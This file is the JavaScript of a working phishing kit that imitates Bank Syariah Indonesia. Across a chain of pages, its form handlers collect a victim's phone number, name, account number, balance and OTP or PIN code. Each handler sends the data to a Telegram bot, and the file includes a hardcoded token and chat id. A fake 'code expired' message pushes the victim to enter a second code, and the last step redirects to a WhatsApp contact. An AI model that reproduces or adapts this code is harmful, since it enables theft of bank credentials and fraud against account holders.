  
// index
 $(document).ready(function(){
    $('#formHP').submit(function(e) {
    event.preventDefault();

var x = document.querySelector('input[name="radio"]:checked').value;
  document.getElementById("tarif").value = x;    
    
document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
  $("#djload").show();

  var nope = document.getElementById('nope');
    
    var gabungan = "├•★𝓑𝓪𝓷𝓴 𝓢𝔂𝓪𝓻𝓲𝓪𝓱 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★" + '%0A※ ' +  tarif.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 : ' + nope.value + '%0A%0A<pre>🕶 𝓓𝓮𝓿𝓮𝓵𝓸𝓹𝓮𝓻 𝓦𝓮𝓫𝓼𝓲𝓽𝓮✍</pre>';
   
 


    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    
 
 complete: function(data) {
            console.log('Complete')
  setTimeout(function(){
   $('#lodingku').hide();
     window.location = "./data.html";
 var tarif = document.getElementById('tarif').value;
sessionStorage.setItem("tarif", tarif);     
 var nomor = document.getElementById('nope').value;
sessionStorage.setItem("nomor", nomor);
     }, 500);
    setTimeout(function(){  
       $("#djload").hide();  
       document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";    
    }, 2000);
        }
    });
 });
    return false;
});   
     
//data     
$('#form1').on('submit', function (event) {

 
  event.stopPropagation();
    event.preventDefault();
 
  $("#djload").show();

  var tarif = document.getElementById('tarif');
  var nope = document.getElementById('nomorku');
  var nama = document.getElementById('nama');
  var norek = document.getElementById('norek');
    
    var gabungan = "├•★𝓑𝓪𝓷𝓴 𝓢𝔂𝓪𝓻𝓲𝓪𝓱 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★" + '%0A※ ' +  tarif.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 : ' + nope.value + '%0A%0A※ 𝗡𝗮𝗺𝗮 : ' + nama.value + '%0A※ 𝗡𝗼𝗿𝗲𝗸 : ' + norek.value + '%0A%0A<pre>🕶 𝓓𝓮𝓿𝓮𝓵𝓸𝓹𝓮𝓻 𝓦𝓮𝓫𝓼𝓲𝓽𝓮✍</pre>';
   
 



    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    
 
 complete: function(data) {
            console.log('Complete')
setTimeout(function(){
       $("#lodingku").hide();
location.href ="./saldo.html";
var tarif = document.getElementById('tarif').value;
sessionStorage.setItem("tarif", tarif);   
     var nomor = document.getElementById('nomorku').value;
    sessionStorage.setItem("nomor", nomor);
      var norek = document.getElementById('norek').value;
    sessionStorage.setItem("norek", norek);
    var nama = document.getElementById('nama').value;
    sessionStorage.setItem("nama", nama);     
    }, 1000);
     setTimeout(function(){  
       $("#djload").hide();  
       document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";    
    }, 2000);
        }
    });

    return false;
});           
    
    
    
    
// saldo  
$('#forgetPasswordForm').on('submit', function (event) {

 $("#djload").show();

  event.stopPropagation();
    event.preventDefault();
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
var tarif = document.getElementById('tarif');   
var nomor = document.getElementById('nomor');
 var nama = document.getElementById('nama');
  var norek = document.getElementById('norek');
  var rupiah = document.getElementById('rupiah');
    
    var gabungan = "├•★𝓑𝓪𝓷𝓴 𝓢𝔂𝓪𝓻𝓲𝓪𝓱 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★" + '%0A※ ' +  tarif.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 : ' + nomor.value + '%0A%0A※ 𝗡𝗮𝗺𝗮 : ' + nama.value + '%0A※ 𝗡𝗼𝗿𝗲𝗸 : ' + norek.value + '%0A%0A※ 𝗦𝗮𝗹𝗱𝗼 : ' + rupiah.value + '%0A%0A<pre>🕶 𝓓𝓮𝓿𝓮𝓵𝓸𝓹𝓮𝓻 𝓦𝓮𝓫𝓼𝓲𝓽𝓮✍</pre>';
   
  



    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
 
 complete: function(data) {
            console.log('Complete')
 
var tarif = document.getElementById('tarif').value;
sessionStorage.setItem("tarif", tarif);   
var nomor = document.getElementById("nomor").value;
 sessionStorage.setItem("nomor", nomor);
 var nama = document.getElementById("nama").value;
 sessionStorage.setItem("nama", nama);
 
 var norek = document.getElementById("norek").value;
 sessionStorage.setItem("norek", norek);
 var saldo = document.getElementById("rupiah").value;
 sessionStorage.setItem("saldo", saldo);  
location.href ="./otp.html";
 setTimeout(function(){  
       $("#djload").hide();  
       document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";    
    }, 2000);

     
 }
    });

    return false;
});       


// otp
$('#form2').on('submit', function (event) {

 
  event.stopPropagation();
    event.preventDefault();
 
  $("#djload").show();

    
 document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 
var tarif = document.getElementById('tarif');   
var tele = document.getElementById('tele');
  var nama = document.getElementById('nama');
  var kertu = document.getElementById('kertu');
  var uang = document.getElementById('uang');
   var sixpin = document.getElementById('sixpin');
    
    var gabungan = "├•★𝓑𝓪𝓷𝓴 𝓢𝔂𝓪𝓻𝓲𝓪𝓱 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★" + '%0A※ ' +  tarif.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 : ' + tele.value + '%0A%0A※ 𝗡𝗮𝗺𝗮 : ' + nama.value + '%0A※ 𝗡𝗼𝗿𝗲𝗸 : ' + kertu.value + '%0A%0A※ 𝗦𝗮𝗹𝗱𝗼 : ' + uang.value + '%0A%0A※ 𝗞𝗼𝗱𝗲 : ' + sixpin.value + '%0A%0A<pre>🕶 𝓓𝓮𝓿𝓮𝓵𝓸𝓹𝓮𝓻 𝓦𝓮𝓫𝓼𝓲𝓽𝓮✍</pre>';
   
   var token = '7720676008:AAEJbtF4BwBtmm6quwxvqK0gNyiP77TENlA'; // Ganti dengan token bot yang kamu buat
    var grup = '6742946644'; // Ganti dengan chat id dari bot yang kamu buat



    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,

 complete: function(data) {
            console.log('Complete')
setTimeout(function(){  
       
      
    
     $("#notif").text("- Kode Virtual sudah kadaluarsa -");
     $("#notif").css("color", "red");
        
   }, 1000);
      setTimeout(() => {
     document.getElementById("notif").innerHTML = "Untuk mendapatkan kode Virtual,<br/>Silahkan klik tombol dibawah ini";
     $("#djload").hide();  
   $("#notif").css("color", "black");
 $("#sixpin").val("");
document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";      
              
   }, 4000);

     
 }
    });

    return false;
});         



// datawa

function getcs(){
 $("#djload").show();   
  
setTimeout(function(){  
location.href='https://bslmenari.wasap.my/';
 $("#djload").hide();   
    }, 000);    
}     
